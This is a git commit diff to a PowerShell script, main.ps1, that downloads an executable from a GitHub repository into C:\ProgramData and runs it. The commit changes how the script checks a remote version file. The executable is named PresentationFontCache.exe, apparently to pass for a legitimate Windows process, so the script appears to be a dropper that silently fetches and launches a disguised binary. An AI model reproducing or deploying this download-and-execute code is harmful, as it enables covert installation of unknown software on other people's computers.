1de76ed4812965bbfcfdf12a2f965b439a2e64c5
qwertyuiopindia <93660031+qwertyuiopindia@users.noreply.github.com>
2023-03-01 01:06:05 +0600

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -7,10 +7,11 @@ $url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.
 $url_exe = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
 $file_exe = "C:\ProgramData\PresentationFontCache.exe"
 
-# Check if the version file exists
-if (Test-Path $url_text) {
-    Write-Host "version text found"
-    # Check if the exe file exists
+
+# Check if the URL exists
+$response = Invoke-WebRequest -Uri $url_text -UseBasicParsing
+if ($response.StatusCode -eq 200) {
+    Write-Host "The URL '$url_text' exists."
     if (Test-Path $file_exe) {
         # Run the exe file
         Start-Process -FilePath $file_exe
@@ -26,9 +27,9 @@ if (Test-Path $url_text) {
             Write-Host "Error downloading the file: $_.Exception.Message"
         }
     }
+    
 } else {
-    Write-Host "No version text"
-    # Updated the exe file
+    Write-Host "The URL '$url_text' does not exist."
     try {
         $down = New-Object System.Net.WebClient
         $down.DownloadFile($url_exe,$file_exe)
